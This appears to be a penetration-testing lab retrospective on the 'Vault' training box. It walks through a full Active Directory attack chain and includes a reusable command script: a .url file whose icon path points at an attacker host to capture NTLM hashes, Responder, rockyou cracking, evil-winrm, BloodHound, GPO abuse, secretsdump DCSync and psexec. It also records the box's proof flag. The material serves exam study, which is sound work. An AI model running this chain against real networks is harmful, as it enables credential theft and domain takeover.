title: Vault Retrospective — Seven Lessons from a Clean DC Compromise
body:
Vault was a textbook AD chain: writable SMB share → URI file attack → NTLMv2 capture → rockyou crack → evil-winrm foothold → BloodHound mapped WriteDacl on Default Domain Policy → SharpGPOAbuse → DC SYSTEM. The methodology worked end to end, but the path had several teaching moments worth preserving.

Final proof: 4885778e1b06f7feef855a57e7169744

— SEVEN LESSONS —

  1. URI FILE ATTACK IS A REAL OFFICIAL PG TERM
     The official OffSec walkthrough names this 'URI file attack' — not
     SCF coercion, not WebDAV trick. It's the umbrella term for forced
     authentication via .lnk/.url/.scf/.library-ms files dropped in a
     writable share. Explorer pre-resolves icon paths the moment a user
     browses the directory — no click required. When you see ANY writable
     share on a Windows target, this is your first move. Drop the file,
     start Responder, wait for someone to browse the folder.
     
     The .url variant from the walkthrough is the canonical form:
       [InternetShortcut]
       URL=anything
       WorkingDirectory=anything
       IconFile=\\KALI_IP\%USERNAME%.icon
       IconIndex=1
     
     The %USERNAME% expansion in IconFile is the elegant part — it tells
     you whose hash you captured by the filename Responder logs.

  2. LAB PASSWORDS ARE WEAK — TRY ROCKYOU FIRST, ALWAYS
     anirudh's password was SecureHM. Cracked in seconds with john +
     rockyou.txt. On lab boxes (PG, OSCP, HTB), passwords are almost always
     in rockyou or rockyou + minor mutations. Don't waste time on hashcat
     rules or custom wordlists until you've tried the basics:
       john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
       hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
     If rockyou doesn't work in 5 minutes, pivot — it's not the path.
     Real engagements need rules and custom lists; lab boxes don't.

  3. SHARPUP SHOWS PRIMITIVES — BLOODHOUND SHOWS PATHS
     SharpUp/winPEAS/PowerUp surface local privilege escalation primitives:
     'You have SeBackupPrivilege! You're in BUILTIN\Server Operators!'
     But primitives aren't paths. SeBackupPrivilege only matters if you
     can use it; Server Operators only matters if a service is exploitable.
     
     On Vault, SharpUp lit up SeBackupPrivilege and Server Operators —
     looked like a slam dunk. Spent 90 minutes on diskshadow/VSS exfil.
     Failed because VSS was intentionally broken in the box image.
     
     BloodHound showed the actual path: WriteDacl on Default Domain
     Policy → GPO abuse. That edge wasn't visible from any local
     enumeration tool because the rights live in AD, not on the local
     machine.
     
     Lesson: on AD boxes, BloodHound is mandatory before deep diving on
     local privesc. Local primitives are secondary. Run bloodhound-python
     the moment you have any domain credential.

  4. BROKEN SUBSYSTEM = WRONG PATH SIGNAL
     diskshadow.exe failed silently. VSS service was running but volume
     creation hung. wbadmin returned cryptic errors. Three different
     SeBackupPrivilege techniques all broke in different ways.
     
     That's not 'I'm doing it wrong' — that's 'this isn't the intended
     path.' OffSec doesn't intentionally break subsystems for boxes where
     that subsystem is the solution. When multiple variants of an
     approach all fail in different ways on the same box: the box wants
     you to try something else.
     
     Set a 30-45 min timer on any privesc attempt. If you're past it and
     still grinding, take the official PG hint or pivot to BloodHound.
     Time is the OSCP exam's most expensive resource.

  5. LOCAL ADMINISTRATOR HASH ON A DC IS LIMITED VALUE
     Vault's local Administrator hash (extractable several ways post-
     exploitation) only authenticates to the DC itself. It does NOT
     authenticate to other domain machines unless the same hash is reused
     locally on those machines.
     
     What you actually want from a DC compromise:
       - krbtgt hash (golden ticket — persistence + DA on any domain host)
       - Domain user hashes (DCSync via secretsdump → pass-the-hash anywhere)
       - Administrator domain account hash (DA — full control)
     
     One command gets all of them once you have admin access:
       impacket-secretsdump -just-dc-ntlm domain/user:pass@dc_ip
     
     Don't fixate on 'the local admin hash' — fixate on krbtgt and the
     domain accounts. That's where domain compromise lives.

  6. WHEN YOU'RE STUCK 30+ MIN ON PRIVESC, TAKE THE PG HINT
     PG Practice and OSCP exam machines have hint structures (PG: official
     walkthrough on the box page; exam: forum posts and the box description
     itself). Pride is expensive. If you've burned 45 minutes on a privesc
     path that isn't working, the cost of reading a hint is much lower
     than the cost of running out of exam time.
     
     The smart play: try independently, set a hard timer, hit the hint,
     keep moving. The exam isn't graded on how cleanly you found it —
     it's graded on whether you got the proof. Pragmatism wins. Read the
     box description carefully, every word — sometimes the hint is hiding
     in plain sight (e.g. 'this box requires Active Directory enumeration').

  7. EXISTING SHELL SESSIONS CACHE OLD ACCESS TOKENS
     This is the lesson Vault delivered most viscerally. After running
     SharpGPOAbuse + gpupdate /force successfully, whoami /priv in the
     existing evil-winrm session showed only the OLD privileges —
     SeBackupPrivilege, SeMachineAccountPrivilege, baseline Server
     Operators rights. The new admin token wasn't visible.
     
     The instinct was 'GPO didn't apply.' That was wrong.
     
     Reality: Windows access tokens are issued at logon time and don't
     refresh on group membership changes. The session that authenticated
     BEFORE the GPO landed is holding a token from BEFORE the change.
     New session = new authentication = new token = new privileges visible.
     
     Two ways to verify which is which:
       From Kali (authoritative — fresh auth every call):
         nxc smb $ip -u anirudh -p 'SecureHM'
         → look for (Pwn3d!) marker = admin access confirmed
       
       In a shell (only valid AFTER reconnecting):
         exit; evil-winrm -i $ip -u anirudh -p 'SecureHM'
         whoami /priv  → now shows new admin priv set
     
     Same lesson applies to: kerberos ticket cache after group changes,
     SMB sessions after credential rotation, anything that authenticated
     before the change. ALWAYS reconnect to verify privesc landed.
     This single lesson will save you 30+ minutes the next time you do
     any AD privilege escalation that involves group membership changes.

— REUSABLE FOOTHOLD CHAIN (FOR FUTURE BOXES) —

  Whenever you see SMB + writable share + Windows target:
    1. Confirm write: smbclient -N //$ip/SHARE → put test.txt
    2. Drop URI file: @hax.url with IconFile=\\KALI\%USERNAME%.icon
    3. Start Responder: sudo responder -I tun0 -wrf
    4. Wait (or coerce browse via cron job/web request)
    5. Capture NTLMv2, save to hash.txt
    6. john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    7. evil-winrm -i $ip -u USER -p 'PASS'
    8. bloodhound-python -d domain.local -u USER -p PASS -ns $ip -c All
    9. Mark Owned, Shortest Path from Owned, follow the edges
  
  This chain works on any AD box with a writable share. Vault is just
  one example. The methodology is the asset; the specific commands are
  interchangeable.
cmd:
# ── REUSABLE VAULT-PATTERN FOOTHOLD CHAIN ────────────

# Stage 1: SMB enumeration + writable share detection
smbclient -N -L //$ip
smbmap -H $ip -u guest                         # check write perms across shares
nxc smb $ip --shares -u '' -p ''               # cme/nxc style

# Stage 2: Confirm write access on candidate share
smbclient -N //$ip/DocumentsShare
# smb: \> put test.txt
# smb: \> ls   (should now show test.txt)

# Stage 3: Drop URI file for forced authentication
cat > @hax.url <<'EOF'
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\KALI_IP\%USERNAME%.icon
IconIndex=1
EOF

smbclient -N //$ip/DocumentsShare -c "put @hax.url"

# Stage 4: Start Responder BEFORE the file is browsed
sudo responder -I tun0 -wrf -v
# -w  WPAD rogue server (extra catch)
# -r  enable answers for netbios wredir suffix
# -f  fingerprint the host
# -v  verbose (see what's happening)

# Stage 5: Wait for hash. Save to file when captured:
echo '<hash>' > hash.txt

# Stage 6: Crack with rockyou
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# Or hashcat:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Stage 7: Foothold via evil-winrm
evil-winrm -i $ip -u USER -p 'PASS'
# With PowerShell scripts available:
evil-winrm -i $ip -u USER -p 'PASS' -s .

# Stage 8: BloodHound the domain
bloodhound-python -d domain.local -u USER -p 'PASS' -ns $ip -c All -dc DC.DOMAIN.LOCAL
# Drag JSONs into BloodHound GUI
# Mark user as Owned → Shortest Path from Owned

# Stage 9: Look for these high-value edges:
#   WriteDacl/GenericAll/GenericWrite/WriteOwner → GPO  → see gpo_abuse
#   ForceChangePassword                          → User → reset and abuse
#   AddMember                                    → Group → join privileged group
#   GenericAll                                   → Computer → resource-based delegation
#   DCSync                                       → Domain → secretsdump immediately

# ── VERIFICATION: TOKEN CACHING WORKAROUND ───────────
# After ANY group membership change (GPO abuse, ACL abuse, AddMember):
# Don't trust your existing shell. Verify from Kali:
nxc smb $ip -u USER -p 'PASS'
# Look for (Pwn3d!) marker — that's authoritative.

# Then reconnect for the loot:
exit
evil-winrm -i $ip -u USER -p 'PASS'
# OR straight to SYSTEM:
impacket-psexec domain/USER:'PASS'@$ip
warn:
Vault was a 'first-try' methodology success — the chain worked, but only because BloodHound was run before going deep on local privesc. If you skip BloodHound and grind on SharpUp findings, you'll burn 90 minutes on the wrong path (SeBackup/VSS) like the first attempt did.

The rabbit hole signal: when multiple variants of an approach (diskshadow, wbadmin, vssadmin) all fail in DIFFERENT ways on the same box — that's the box telling you it's not the path. Real boxes don't intentionally break the intended subsystem.

Token caching deserves its own callout: existing sessions hold OLD tokens after group changes. Always reconnect to verify privesc landed. nxc from Kali is the authoritative check (no token cache). This single gotcha will trip you up at least once on the OSCP exam if you don't internalize it now.

Pride costs time on OSCP. Set a hard 30-45 min timer on privesc paths. If you're past it, take the hint or pivot. The exam grades proofs, not how cleanly you found them.

choices.label: Apply chain on a new SMB writable share
Run BloodHound — find the AD path
